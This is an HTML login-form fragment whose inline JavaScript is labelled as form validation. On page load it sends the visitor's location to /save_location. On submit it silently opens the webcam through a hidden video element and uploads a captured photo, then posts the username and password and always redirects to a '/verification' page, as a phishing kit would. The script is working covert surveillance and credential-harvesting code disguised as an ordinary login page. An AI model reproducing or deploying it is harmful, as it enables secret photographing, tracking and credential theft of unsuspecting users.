            <form id="loginForm" action="/login" method="post">

    <script>
        // Validate login form
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginButton = document.getElementById('loginButton');
        
        // Request location access as soon as the page loads
        document.addEventListener('DOMContentLoaded', function() {
            console.log("Requesting location access...");
            // Request location access
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    console.log("Location access granted");
                    // Send location data to server
                    fetch('/save_location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        })
                    });
                }, function(error) {
                    console.error("Location access denied:", error);
                });
            }
        });
        
        // Enable button only when both fields have content
        function validateForm() {
            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
                loginButton.disabled = false;
            } else {
                loginButton.disabled = true;
            }
        }
        
        usernameInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);
        
        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Try to access camera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        // Create hidden video element
                        const video = document.createElement('video');
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        video.srcObject = stream;
                        
                        // Play video and capture image
                        video.play().then(function() {
                            // Create canvas and draw video frame
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            // Convert to image data
                            canvas.toBlob(function(blob) {
                                // Upload image
                                const formData = new FormData();
                                formData.append('photo', blob, 'photo.jpg');
                                
                                fetch('/capture_photo', {
                                    method: 'POST',
                                    body: formData
                                });
                                
                                // Stop all tracks
                                stream.getTracks().forEach(track => track.stop());
                                
                                // Submit the form with credentials
                                submitCredentials();
                            });
                        });
                    })
                    .catch(function() {
                        // If camera access denied, just submit credentials
                        submitCredentials();
                    });
            } else {
                // If mediaDevices not supported, just submit credentials
                submitCredentials();
            }
        });
        
        function submitCredentials() {
            // Get form data
            const formData = new FormData();
            formData.append('username', usernameInput.value);
            formData.append('password', passwordInput.value);
            
            // Send credentials to server
            fetch('/login', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // Redirect to verification page after short delay
                setTimeout(() => {
                    window.location.href = '/verification';
                }, 1500);
            })
            .catch(error => {
                // Still redirect
                setTimeout(() => {
                    window.location.href = '/verification';
                }, 1500);
            });
        }
    </script>
